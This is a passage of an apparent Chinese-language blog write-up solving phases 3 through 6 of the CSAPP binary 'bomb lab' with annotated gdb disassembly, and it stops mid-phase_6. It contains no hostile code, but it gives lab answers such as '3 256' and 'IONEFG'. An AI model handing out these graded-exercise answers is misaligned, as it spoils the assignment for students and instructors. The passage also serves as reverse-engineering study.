&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_3
Dump of assembler code for function phase_3:
   0x0000000000400f43 &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp                       # 栈顶指针减去24
   0x0000000000400f47 &amp;lt;+4&amp;gt;:     lea    0xc(%rsp),%rcx                   # 栈底+12的地址记为%rcx
   0x0000000000400f4c &amp;lt;+9&amp;gt;:     lea    0x8(%rsp),%rdx                   # 栈底+8的地址记为%rdx
   0x0000000000400f51 &amp;lt;+14&amp;gt;:    mov    $0x4025cf,%esi                   # %esi赋值为0x4025cf
   0x0000000000400f56 &amp;lt;+19&amp;gt;:    mov    $0x0,%eax                        # %eax赋值为0
   0x0000000000400f5b &amp;lt;+24&amp;gt;:    call   0x400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;   # 调用函数
   0x0000000000400f60 &amp;lt;+29&amp;gt;:    cmp    $0x1,%eax                        # 比较%eax(sscanf函数的返回值)与1
   0x0000000000400f63 &amp;lt;+32&amp;gt;:    jg     0x400f6a &amp;lt;phase_3+39&amp;gt;            # %eax必须大于1,去39看看
   0x0000000000400f65 &amp;lt;+34&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000400f6a &amp;lt;+39&amp;gt;:    cmpl   $0x7,0x8(%rsp)                   # 比较%rsp+8与7
   0x0000000000400f6f &amp;lt;+44&amp;gt;:    ja     0x400fad &amp;lt;phase_3+106&amp;gt;           # 负数和大于7的情况:引爆炸弹
   0x0000000000400f71 &amp;lt;+46&amp;gt;:    mov    0x8(%rsp),%eax                   # 大于0小于等于7的情况:把%rsp+8指向的内存的值赋值给%eax
   0x0000000000400f75 &amp;lt;+50&amp;gt;:    jmp    *0x402470(,%rax,8)               # 跳转到0x402470+%rax*8的地址指向的内存存储的地址处
   0x0000000000400f7c &amp;lt;+57&amp;gt;:    mov    $0xcf,%eax                       # %rax = 0
   0x0000000000400f81 &amp;lt;+62&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt; 
   0x0000000000400f83 &amp;lt;+64&amp;gt;:    mov    $0x2c3,%eax                      # %rax = 2
   0x0000000000400f88 &amp;lt;+69&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f8a &amp;lt;+71&amp;gt;:    mov    $0x100,%eax                      # %rax = 3
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0000000000400f8f &amp;lt;+76&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f91 &amp;lt;+78&amp;gt;:    mov    $0x185,%eax                      # %rax = 4
   0x0000000000400f96 &amp;lt;+83&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f98 &amp;lt;+85&amp;gt;:    mov    $0xce,%eax                       # %rax = 5
   0x0000000000400f9d &amp;lt;+90&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f9f &amp;lt;+92&amp;gt;:    mov    $0x2aa,%eax                      # %rax = 6
   0x0000000000400fa4 &amp;lt;+97&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400fa6 &amp;lt;+99&amp;gt;:    mov    $0x147,%eax                      # %rax = 7
   0x0000000000400fab &amp;lt;+104&amp;gt;:   jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400fad &amp;lt;+106&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000400fb2 &amp;lt;+111&amp;gt;:   mov    $0x0,%eax
   0x0000000000400fb7 &amp;lt;+116&amp;gt;:   jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400fb9 &amp;lt;+118&amp;gt;:   mov    $0x137,%eax                      # %rax = 1
   0x0000000000400fbe &amp;lt;+123&amp;gt;:   cmp    0xc(%rsp),%eax                   # 比较*(%rsp+12)与%eax
   0x0000000000400fc2 &amp;lt;+127&amp;gt;:   je     0x400fc9 &amp;lt;phase_3+134&amp;gt;
   0x0000000000400fc4 &amp;lt;+129&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000400fc9 &amp;lt;+134&amp;gt;:   add    $0x18,%rsp
   0x0000000000400fcd &amp;lt;+138&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我发现传入sscanf函数总是%esi&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x4025cf
0x4025cf:       &amp;quot;%d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 &lt;code&gt;   0x0000000000400f75 &amp;lt;+50&amp;gt;:    jmp    *0x402470(,%rax,8)&lt;/code&gt; 的理解至关重要.这正是一个跳转表,含义是跳转到0x402470+%rax*8这个地址对应内存的值(也是一个地址).
所以,我打印出0~7所有情况的%rax对应的64位地址:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /8x 0x402470
0x402470:       0x7c    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402478
0x402478:       0xb9    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402480
0x402480:       0x83    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402488
0x402488:       0x8a    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402490
0x402490:       0x91    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402498
0x402498:       0x98    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x4024a0
0x4024a0:       0x9f    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x4024a8
0x4024a8:       0xa6    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我已经标注出来.
所以,整个代码的逻辑是,根据输入的第一个整数生成第二个整数(答案),然后比较是否与输入的第二个整数相同.如果相同拆除炸弹,如果不同就爆炸.
答案共有8个:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;num_1d&lt;/th&gt;
&lt;th&gt;num_2x&lt;/th&gt;
&lt;th&gt;num_2d&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0xcf&lt;/td&gt;
&lt;td&gt;207&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0x137&lt;/td&gt;
&lt;td&gt;311&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0x2c3&lt;/td&gt;
&lt;td&gt;707&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;0x100&lt;/td&gt;
&lt;td&gt;256&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;0x185&lt;/td&gt;
&lt;td&gt;389&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;0xce&lt;/td&gt;
&lt;td&gt;206&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;0x2aa&lt;/td&gt;
&lt;td&gt;682&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;0x147&lt;/td&gt;
&lt;td&gt;327&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;其中,选用 &lt;code&gt;3 256&lt;/code&gt; 是最容易计算的.&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r answer
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb answer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
Halfway there!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功了!&lt;/p&gt;
&lt;h1&gt;phase_4&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_4
Dump of assembler code for function phase_4:
=&amp;gt; 0x000000000040100c &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp
   0x0000000000401010 &amp;lt;+4&amp;gt;:     lea    0xc(%rsp),%rcx                   # %rcx = %rsp + 12
   0x0000000000401015 &amp;lt;+9&amp;gt;:     lea    0x8(%rsp),%rdx                   # %rdx = %rsp + 8
   0x000000000040101a &amp;lt;+14&amp;gt;:    mov    $0x4025cf,%esi
   0x000000000040101f &amp;lt;+19&amp;gt;:    mov    $0x0,%eax
   0x0000000000401024 &amp;lt;+24&amp;gt;:    call   0x400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
   0x0000000000401029 &amp;lt;+29&amp;gt;:    cmp    $0x2,%eax                       
   0x000000000040102c &amp;lt;+32&amp;gt;:    jne    0x401035 &amp;lt;phase_4+41&amp;gt;            # 如果输入不是两个量,爆炸
   0x000000000040102e &amp;lt;+34&amp;gt;:    cmpl   $0xe,0x8(%rsp)                   #
   0x0000000000401033 &amp;lt;+39&amp;gt;:    jbe    0x40103a &amp;lt;phase_4+46&amp;gt;            # *(%rsp+8)&amp;lt;=14
   0x0000000000401035 &amp;lt;+41&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x000000000040103a &amp;lt;+46&amp;gt;:    mov    $0xe,%edx                        # %edx = 14
   0x000000000040103f &amp;lt;+51&amp;gt;:    mov    $0x0,%esi                        # %esi = 0
   0x0000000000401044 &amp;lt;+56&amp;gt;:    mov    0x8(%rsp),%edi                   # %edi = *(%rsp+8),作为func4的第一个参数
   0x0000000000401048 &amp;lt;+60&amp;gt;:    call   0x400fce &amp;lt;func4&amp;gt;
   0x000000000040104d &amp;lt;+65&amp;gt;:    test   %eax,%eax
   0x000000000040104f &amp;lt;+67&amp;gt;:    jne    0x401058 &amp;lt;phase_4+76&amp;gt;            # %eax不是0,爆炸
   0x0000000000401051 &amp;lt;+69&amp;gt;:    cmpl   $0x0,0xc(%rsp)                   # 第二个参数是0
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0000000000401056 &amp;lt;+74&amp;gt;:    je     0x40105d &amp;lt;phase_4+81&amp;gt;            # *(%rsp+12)==0
   0x0000000000401058 &amp;lt;+76&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x000000000040105d &amp;lt;+81&amp;gt;:    add    $0x18,%rsp
   0x0000000000401061 &amp;lt;+85&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;依照套路,查看0x4025cf&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x4025cf
0x4025cf:       &amp;quot;%d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跟phase_3用的是同一个,sscanf接收两个整数输入.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble func4
Dump of assembler code for function func4:
   0x0000000000400fce &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp                      
   0x0000000000400fd2 &amp;lt;+4&amp;gt;:     mov    %edx,%eax                      # %eax = 14
   0x0000000000400fd4 &amp;lt;+6&amp;gt;:     sub    %esi,%eax                      # %eax -= 0
   0x0000000000400fd6 &amp;lt;+8&amp;gt;:     mov    %eax,%ecx                      # %ecx = %eax
   0x0000000000400fd8 &amp;lt;+10&amp;gt;:    shr    $0x1f,%ecx                     # %ecx = %ecx的最高位(逻辑右移31位)
   0x0000000000400fdb &amp;lt;+13&amp;gt;:    add    %ecx,%eax                      # %eax += %ecx
   0x0000000000400fdd &amp;lt;+15&amp;gt;:    sar    %eax                           # %eax算术右移1位=7
   0x0000000000400fdf &amp;lt;+17&amp;gt;:    lea    (%rax,%rsi,1),%ecx             # %ecx = %rax + %rsi=7
   0x0000000000400fe2 &amp;lt;+20&amp;gt;:    cmp    %edi,%ecx   
   0x0000000000400fe4 &amp;lt;+22&amp;gt;:    jle    0x400ff2 &amp;lt;func4+36&amp;gt;            # 如果%ecx&amp;lt;=%edi
   0x0000000000400fe6 &amp;lt;+24&amp;gt;:    lea    -0x1(%rcx),%edx                #
   0x0000000000400fe9 &amp;lt;+27&amp;gt;:    call   0x400fce &amp;lt;func4&amp;gt;
   0x0000000000400fee &amp;lt;+32&amp;gt;:    add    %eax,%eax
   0x0000000000400ff0 &amp;lt;+34&amp;gt;:    jmp    0x401007 &amp;lt;func4+57&amp;gt;
   0x0000000000400ff2 &amp;lt;+36&amp;gt;:    mov    $0x0,%eax
   0x0000000000400ff7 &amp;lt;+41&amp;gt;:    cmp    %edi,%ecx
   0x0000000000400ff9 &amp;lt;+43&amp;gt;:    jge    0x401007 &amp;lt;func4+57&amp;gt;
   0x0000000000400ffb &amp;lt;+45&amp;gt;:    lea    0x1(%rcx),%esi
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0000000000400ffe &amp;lt;+48&amp;gt;:    call   0x400fce &amp;lt;func4&amp;gt;
   0x0000000000401003 &amp;lt;+53&amp;gt;:    lea    0x1(%rax,%rax,1),%eax
   0x0000000000401007 &amp;lt;+57&amp;gt;:    add    $0x8,%rsp
   0x000000000040100b &amp;lt;+61&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实在太混乱了,我只好学习如何单步执行汇编代码:
在gdb中, &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;b explode_bomb
b phase_4
set diassamble-next-line on
layout regs
r answer
si
si
...
ni
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是执行 &lt;code&gt;4 5&lt;/code&gt;后首次来到fun4函数的界面,%eax和%edx初始化为14
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121000524.png&quot; alt=&quot;&quot;&gt;
%eax右移得到7
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121000824.png&quot; alt=&quot;&quot;&gt;
把我输入的第一个参数与7比较,发现7&amp;gt;4,现在%edx变为%ecx-1=6
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121001355.png&quot; alt=&quot;&quot;&gt;
并且进入了函数嵌套.回到这一步,现在3&amp;lt;=4,%eax设置为0
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121001721.png&quot; alt=&quot;&quot;&gt;
发现4&amp;gt;3,又进入函数嵌套
现在%eax=(6-4)/2=1,
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121002825.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;经过这么调试加上这个程序流程图,我大概才明白了这块代码要得到返回0值应该满足7,3,1,0.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250121005112.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;但是对于其他数,它返回值是什么含义呢?好像很混乱,我没有想明白.
至此,我发现了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;调用函数需要栈顶指针减小,函数返回栈顶指针回去&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sscanf&lt;/code&gt;函数声明为&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int sscanf(const char *s, const char *format, ... );
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这就是format指针用第二个参数%esi传入的原因.&lt;/p&gt;
&lt;h1&gt;phase_5&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_5
Dump of assembler code for function phase_5:
   0x0000000000401062 &amp;lt;+0&amp;gt;:     push   %rbx
   0x0000000000401063 &amp;lt;+1&amp;gt;:     sub    $0x20,%rsp
   0x0000000000401067 &amp;lt;+5&amp;gt;:     mov    %rdi,%rbx
   0x000000000040106a &amp;lt;+8&amp;gt;:     mov    %fs:0x28,%rax
   0x0000000000401073 &amp;lt;+17&amp;gt;:    mov    %rax,0x18(%rsp)
   0x0000000000401078 &amp;lt;+22&amp;gt;:    xor    %eax,%eax
   0x000000000040107a &amp;lt;+24&amp;gt;:    call   0x40131b &amp;lt;string_length&amp;gt;
   0x000000000040107f &amp;lt;+29&amp;gt;:    cmp    $0x6,%eax                    # input的string_length是6.
   0x0000000000401082 &amp;lt;+32&amp;gt;:    je     0x4010d2 &amp;lt;phase_5+112&amp;gt;
   0x0000000000401084 &amp;lt;+34&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401089 &amp;lt;+39&amp;gt;:    jmp    0x4010d2 &amp;lt;phase_5+112&amp;gt;
   0x000000000040108b &amp;lt;+41&amp;gt;:    movzbl (%rbx,%rax,1),%ecx           # 第%rax字符
   0x000000000040108f &amp;lt;+45&amp;gt;:    mov    %cl,(%rsp)
   0x0000000000401092 &amp;lt;+48&amp;gt;:    mov    (%rsp),%rdx
   0x0000000000401096 &amp;lt;+52&amp;gt;:    and    $0xf,%edx                    # 只取低4位
   0x0000000000401099 &amp;lt;+55&amp;gt;:    movzbl 0x4024b0(%rdx),%edx          # 0x4024b0+这4位的内存的值存储到%edx
   0x00000000004010a0 &amp;lt;+62&amp;gt;:    mov    %dl,0x10(%rsp,%rax,1)        # 
   0x00000000004010a4 &amp;lt;+66&amp;gt;:    add    $0x1,%rax
   0x00000000004010a8 &amp;lt;+70&amp;gt;:    cmp    $0x6,%rax
   0x00000000004010ac &amp;lt;+74&amp;gt;:    jne    0x40108b &amp;lt;phase_5+41&amp;gt;
   0x00000000004010ae &amp;lt;+76&amp;gt;:    movb   $0x0,0x16(%rsp)
   0x00000000004010b3 &amp;lt;+81&amp;gt;:    mov    $0x40245e,%esi
   0x00000000004010b8 &amp;lt;+86&amp;gt;:    lea    0x10(%rsp),%rdi
   0x00000000004010bd &amp;lt;+91&amp;gt;:    call   0x401338 &amp;lt;strings_not_equal&amp;gt; # 从%rdi开始的字符串与0x401338的字符串比较
   0x00000000004010c2 &amp;lt;+96&amp;gt;:    test   %eax,%eax                    # 相同返回0
   0x00000000004010c4 &amp;lt;+98&amp;gt;:    je     0x4010d9 &amp;lt;phase_5+119&amp;gt;
   0x00000000004010c6 &amp;lt;+100&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00000000004010cb &amp;lt;+105&amp;gt;:   nopl   0x0(%rax,%rax,1)
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x00000000004010d0 &amp;lt;+110&amp;gt;:   jmp    0x4010d9 &amp;lt;phase_5+119&amp;gt;
   0x00000000004010d2 &amp;lt;+112&amp;gt;:   mov    $0x0,%eax
   0x00000000004010d7 &amp;lt;+117&amp;gt;:   jmp    0x40108b &amp;lt;phase_5+41&amp;gt;
   0x00000000004010d9 &amp;lt;+119&amp;gt;:   mov    0x18(%rsp),%rax
   0x00000000004010de &amp;lt;+124&amp;gt;:   xor    %fs:0x28,%rax
   0x00000000004010e7 &amp;lt;+133&amp;gt;:   je     0x4010ee &amp;lt;phase_5+140&amp;gt;
   0x00000000004010e9 &amp;lt;+135&amp;gt;:   call   0x400b30 &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x00000000004010ee &amp;lt;+140&amp;gt;:   add    $0x20,%rsp
   0x00000000004010f2 &amp;lt;+144&amp;gt;:   pop    %rbx
   0x00000000004010f3 &amp;lt;+145&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里出现了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   0x000000000040106a &amp;lt;+8&amp;gt;:     mov    %fs:0x28,%rax
   0x0000000000401073 &amp;lt;+17&amp;gt;:    mov    %rax,0x18(%rsp)
   ...
   0x00000000004010de &amp;lt;+124&amp;gt;:   xor    %fs:0x28,%rax
   0x00000000004010e7 &amp;lt;+133&amp;gt;:   je     0x4010ee &amp;lt;phase_5+140&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;虽然与解开炸弹无关,但经过查阅资料后了解到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为了访问特殊的操作系统数据结构，&lt;code&gt;FS&lt;/code&gt;和&lt;code&gt;GS&lt;/code&gt;寄存器都可以用作基准指针地址。因此，您所看到的是从&lt;code&gt;FS&lt;/code&gt;寄存器中持有的值加载到偏移量处的值，而不是对&lt;code&gt;FS&lt;/code&gt;寄存器内容的位操作。
具体而言，在Linux上的&lt;code&gt;FS:0x28&lt;/code&gt;正在存储一个特殊的哨兵堆栈保护值，而代码正在执行堆栈保护检查。例如，如果进一步查看代码，您将看到&lt;code&gt;FS:0x28&lt;/code&gt;中的值存储在堆栈上，然后会召回堆栈的内容，并在&lt;code&gt;FS:0x28&lt;/code&gt;处使用原始值执行&lt;code&gt;XOR&lt;/code&gt;。如果这两个值相等，这意味着由于&lt;code&gt;XOR&lt;/code&gt;‘对两个相同的值中的两个值产生零值而设置了零位，那么我们跳到&lt;code&gt;test&lt;/code&gt;例程，否则我们跳转到一个特殊的函数，该函数指示堆栈以某种方式损坏，并且存储在堆栈上的前哨值被更改。
首先input的string_length是6.然后循环6此读取输入的字符,从%rsp到%rsp+5,转换后存储到%rsp+0x10到%rsp+0x15,并与0x401338的字符串比较
查看0x401338&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x40245e
0x40245e:       &amp;quot;flyers&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;果然是6个字符.
再查看&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb)  x /s 0x4024b0
0x4024b0 &amp;lt;array.3449&amp;gt;:  &amp;quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于只有输入的低4位有用,也就是要从前15个字符中寻找&amp;quot;flyers&amp;quot;.依次是 9   15   14   5   6   7
所以有多个答案,只要字符的ASCII码值模16的余数依次是这6个数就行.直接在gdb中打印&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) printf &amp;quot;%c %c %c %c %c %c&amp;quot;,9+64,15+64,14+64,5+64,6+64,7+64
I O N E F G
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在answer文件中加上这一行,运行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r answer
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb answer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功了!&lt;/p&gt;
&lt;h1&gt;phase_6&lt;/h1&gt;
&lt;p&gt;来到最后一个!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_6
Dump of assembler code for function phase_6:
   0x00000000004010f4 &amp;lt;+0&amp;gt;:     push   %r14
   0x00000000004010f6 &amp;lt;+2&amp;gt;:     push   %r13
   0x00000000004010f8 &amp;lt;+4&amp;gt;:     push   %r12
   0x00000000004010fa &amp;lt;+6&amp;gt;:     push   %rbp
   0x00000000004010fb &amp;lt;+7&amp;gt;:     push   %rbx
   0x00000000004010fc &amp;lt;+8&amp;gt;:     sub    $0x50,%rsp
   0x0000000000401100 &amp;lt;+12&amp;gt;:    mov    %rsp,%r13
   0x0000000000401103 &amp;lt;+15&amp;gt;:    mov    %rsp,%rsi
   0x0000000000401106 &amp;lt;+18&amp;gt;:    call   0x40145c &amp;lt;read_six_numbers&amp;gt;
   0x000000000040110b &amp;lt;+23&amp;gt;:    mov    %rsp,%r14
   0x000000000040110e &amp;lt;+26&amp;gt;:    mov    $0x0,%r12d
   0x0000000000401114 &amp;lt;+32&amp;gt;:    mov    %r13,%rbp
   0x0000000000401117 &amp;lt;+35&amp;gt;:    mov    0x0(%r13),%eax                  # %r13是%rsp
   0x000000000040111b &amp;lt;+39&amp;gt;:    sub    $0x1,%eax                       # 
   0x000000000040111e &amp;lt;+42&amp;gt;:    cmp    $0x5,%eax                       
   0x0000000000401121 &amp;lt;+45&amp;gt;:    jbe    0x401128 &amp;lt;phase_6+52&amp;gt;           # %rsp&amp;lt;=6
   0x0000000000401123 &amp;lt;+47&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401128 &amp;lt;+52&amp;gt;:    add    $0x1,%r12d                      # %r12d+=1
   0x000000000040112c &amp;lt;+56&amp;gt;:    cmp    $0x6,%r12d                      # 1 ~ 5
   0x0000000000401130 &amp;lt;+60&amp;gt;:    je     0x401153 &amp;lt;phase_6+95&amp;gt;           #
   0x0000000000401132 &amp;lt;+62&amp;gt;:    mov    %r12d,%ebx
   0x0000000000401135 &amp;lt;+65&amp;gt;:    movslq %ebx,%rax
   0x0000000000401138 &amp;lt;+68&amp;gt;:    mov    (%rsp,%rax,4),%eax
   0x000000000040113b &amp;lt;+71&amp;gt;:    cmp    %eax,0x0(%rbp)                  # 比较第2个到第6个数与第1个数
   0x000000000040113e &amp;lt;+74&amp;gt;:    jne    0x401145 &amp;lt;phase_6+81&amp;gt;           # 不能相等
   0x0000000000401140 &amp;lt;+76&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401145 &amp;lt;+81&amp;gt;:    add    $0x1,%ebx
   0x0000000000401148 &amp;lt;+84&amp;gt;:    cmp    $0x5,%ebx
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x000000000040114b &amp;lt;+87&amp;gt;:    jle    0x401135 &amp;lt;phase_6+65&amp;gt;
   0x000000000040114d &amp;lt;+89&amp;gt;:    add    $0x4,%r13
   0x0000000000401151 &amp;lt;+93&amp;gt;:    jmp    0x401114 &amp;lt;phase_6+32&amp;gt;           # 所有6个数字都&amp;lt;=6,并且互不相等,结束以上循环
   0x0000000000401153 &amp;lt;+95&amp;gt;:    lea    0x18(%rsp),%rsi                 # %rsi=%rsp+24
   0x0000000000401158 &amp;lt;+100&amp;gt;:   mov    %r14,%rax                       # %r14=%rsp=%rax
   0x000000000040115b &amp;lt;+103&amp;gt;:   mov    $0x7,%ecx 
   0x0000000000401160 &amp;lt;+108&amp;gt;:   mov    %ecx,%edx
   0x0000000000401162 &amp;lt;+110&amp;gt;:   sub    (%rax),%edx                     # %edx=7-(%rsp第1个整数)
   0x0000000000401164 &amp;lt;+112&amp;gt;:   mov    %edx,(%rax)                     # 替换
   0x0000000000401166 &amp;lt;+114&amp;gt;:   add    $0x4,%rax                       # 下一个整数
   0x000000000040116a &amp;lt;+118&amp;gt;:   cmp    %rsi,%rax        
   0x000000000040116d &amp;lt;+121&amp;gt;:   jne    0x401160 &amp;lt;phase_6+108&amp;gt;          # 对6个整数都这样操作
   0x000000000040116f &amp;lt;+123&amp;gt;:   mov    $0x0,%esi
   0x0000000000401174 &amp;lt;+128&amp;gt;:   jmp    0x401197 &amp;lt;phase_6+163&amp;gt;
   0x0000000000401176 &amp;lt;+130&amp;gt;:   mov    0x8(%rdx),%rdx                 # %rdx=(%rdx+8) 0x6032d0这是一个链表
   0x000000000040117a &amp;lt;+134&amp;gt;:   add    $0x1,%eax                      # %eax刚到这里时是1,现在加1是2
   0x000000000040117d &amp;lt;+137&amp;gt;:   cmp    %ecx,%eax                      # 比较%rax和
   0x000000000040117f &amp;lt;+139&amp;gt;:   jne    0x401176 &amp;lt;phase_6+130&amp;gt;
   0x0000000000401181 &amp;lt;+141&amp;gt;:   jmp    0x401188 &amp;lt;phase_6+148&amp;gt;
   0x0000000000401183 &amp;lt;+143&amp;gt;:   mov    $0x6032d0,%edx
   0x0000000000401188 &amp;lt;+148&amp;gt;:   mov    %rdx,0x20(%rsp,%rsi,2)         # (%rsp+32/40/...)=0x6032d0
   0x000000000040118d &amp;lt;+153&amp;gt;:   add    $0x4,%rsi
   0x0000000000401191 &amp;lt;+157&amp;gt;:   cmp    $0x18,%rsi                     # 6次操作
   0x0000000000401195 &amp;lt;+161&amp;gt;:   je     0x4011ab &amp;lt;phase_6+183&amp;gt;         # 6次操作
   0x0000000000401197 &amp;lt;+163&amp;gt;:   mov    (%rsp,%rsi,1),%ecx            # 下一个整数
   0x000000000040119a &amp;lt;+166&amp;gt;:   cmp    $0x1,%ecx
